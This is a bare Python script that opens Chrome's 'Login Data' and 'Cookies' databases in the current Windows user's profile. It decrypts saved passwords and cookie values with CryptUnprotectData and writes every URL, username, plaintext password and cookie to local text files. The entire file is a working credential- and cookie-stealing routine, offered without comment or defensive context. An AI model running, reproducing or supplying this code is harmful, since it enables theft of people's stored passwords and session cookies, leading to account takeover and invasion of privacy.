import sqlite3
from os import getlogin
import win32crypt

paths = [f'C:\\Users\\{getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',f'C:\\Users\\{getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies']

for path in paths:
	try:
		open(path,'rb')
		if 'Login Data' in path:
			db = sqlite3.connect(path)
			c = db.cursor()
			f = open('Login Data.txt','a')
			for url,username,password in c.execute('SELECT origin_url,username_value,password_value FROM logins'):
				passwd = win32crypt.CryptUnprotectData(password)
				passwd = passwd[1].decode('utf-8')
				f.write(f'#####\nurl: {url} \nusername: {username} \npassword: {passwd}\n#####\n\n')
				f.flush()
			f.close()
		else:
			db = sqlite3.connect(path)
			c = db.cursor()
			f = open('cookies.txt','a')
			for host_key,name,dpath,encrypted_value,has_expires in c.execute('SELECT host_key,name,path,encrypted_value,has_expires FROM cookies'):
				cookie = win32crypt.CryptUnprotectData(encrypted_value)
				cookie = cookie[1].decode('utf-8')
				f.write(f'####################\nhost_key: {host_key} \npath: {dpath} \ncookie: {cookie}\nhas_expires: {has_expires}\n####################\n\n')
	except FileNotFoundError:
		pass

